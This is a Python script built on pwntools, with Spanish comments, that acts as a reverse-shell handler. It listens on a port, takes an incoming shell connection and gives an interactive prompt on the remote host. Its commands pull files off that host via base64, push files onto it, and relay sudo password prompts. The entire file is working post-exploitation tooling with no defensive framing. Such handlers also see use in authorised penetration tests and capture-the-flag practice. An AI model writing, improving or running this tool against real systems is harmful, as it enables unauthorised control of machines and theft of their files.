#/usr/bin/python

from pwn import *
import sys
import os
import base64
import time
import re
import signal

def clean_ansi(text):
    """ Elimina caracteres de escape ANSI y líneas vacías innecesarias """
    ansi_escape = re.compile(r'\x1b(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])|\x07|\x0f|\x0e')
    cleaned = ansi_escape.sub('', text)
    return '\n'.join([line for line in cleaned.split('\n') if line.strip()])

def sigint_handler(signum, frame):
    print("\n[+] Ctrl+C detectado, deteniendo proceso remoto...")
    conn.sendline(b'kill -2 $$')  # Enviar SIGINT al proceso remoto

def start_listener(port):
    global conn
    try:
        # Crear el socket en escucha
        server = listen(port)
        log.success(f"Escuchando en el puerto {port}...")
        
        # Esperar la conexión
        conn = server.wait_for_connection()
        log.success("Conexión recibida, iniciando shell interactiva...")
        
        # Capturar Ctrl+C y enviar SIGINT al proceso remoto en lugar de cerrar la shell
        signal.signal(signal.SIGINT, sigint_handler)
        
        while True:
            # Obtener usuario y ruta actual sin enviar el prompt a la shell remota
            conn.sendline(b'pwd')
            path = clean_ansi(conn.recvline(timeout=2).decode(errors='ignore').strip())
            
            conn.sendline(b'whoami')
            user = clean_ansi(conn.recvline(timeout=2).decode(errors='ignore').strip())
            
            if not path:
                path = "/unknown"
            if not user:
                user = "user"
            
            # Colorear usuario y ruta
            user_colored = f"\033[1;34m{user}\033[0m"  # Azul
            path_colored = f"\033[1;32m{path}\033[0m"  # Verde
            
            # Mostrar el prompt solo en el listener, no enviarlo a la shell remota
            prompt = f"{user_colored}@{path_colored}$ "
            print(prompt, end="", flush=True)
            
            # Leer comando del usuario
            cmd = sys.stdin.readline().strip()
            if not cmd:
                continue
            
            if cmd.lower() == "exit":
                log.info("Cerrando conexión...")
                break
            elif cmd.startswith("download "):
                file_path = cmd.split(" ", 1)[1]
                try:
                    conn.sendline(f"base64 -w 0 {file_path}".encode())
                    file_data = clean_ansi(conn.recvrepeat(2).decode().strip())
                    with open(os.path.basename(file_path), "wb") as f:
                        f.write(base64.b64decode(file_data))
                    log.success(f"Archivo {file_path} descargado exitosamente.")
                except Exception as e:
                    log.error(f"Error al descargar el archivo: {e}")
            elif cmd.startswith("upload "):
                file_path = cmd.split(" ", 1)[1]
                try:
                    with open(file_path, "rb") as f:
                        file_data = base64.b64encode(f.read()).decode()
                    conn.sendline(f"echo {file_data} | base64 -d > {os.path.basename(file_path)}".encode())
                    log.success(f"Archivo {file_path} subido exitosamente.")
                except Exception as e:
                    log.error(f"Error al subir el archivo: {e}")
            elif cmd.startswith("sudo "):
                conn.sendline(f"export TERM=xterm; script -qc \"{cmd}\" /dev/null".encode())
                output = clean_ansi(conn.recvrepeat(1.5).decode(errors='ignore').strip())
                if "password for" in output.lower():
                    print(output)  # Mostrar la solicitud de contraseña limpia
                    password = sys.stdin.readline().strip()
                    conn.sendline(password.encode())
                output = clean_ansi(conn.recvrepeat(1.5).decode(errors='ignore').strip())
                print(output)
            else:
                conn.sendline(cmd.encode())
                output = clean_ansi(conn.recvrepeat(0.5).decode(errors='ignore').strip())
                if output:
                    print(output)
    except Exception as e:
        log.error(f"Error: {str(e)}")
    finally:
        server.close()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <puerto>")
        sys.exit(1)
    
    try:
        port = int(sys.argv[1])
        start_listener(port)
    except ValueError:
        log.error("El puerto debe ser un número entero válido.")

  
